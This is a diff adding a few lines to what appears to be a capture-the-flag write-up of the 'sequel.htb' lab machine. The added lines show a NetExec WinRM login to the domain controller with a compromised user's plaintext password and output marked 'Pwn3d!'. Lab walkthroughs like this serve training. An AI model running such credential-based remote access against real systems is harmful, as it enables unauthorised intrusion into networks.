@@ -350,6 +350,16 @@ LDAP        10.129.7.162    389    DC               [+] sequel.htb\ryan.cooper:N
 Another user compromised
 
 ```python
+nxc winrm dc.sequel.htb -u ryan.cooper -p NuclearMosquito3
+'WINRM       10.129.7.162    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.7.162    5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)
+```
+This user also has access via WINRM
+
+## Winrm access as `ryan.cooper`
+```python
 
 ```
 
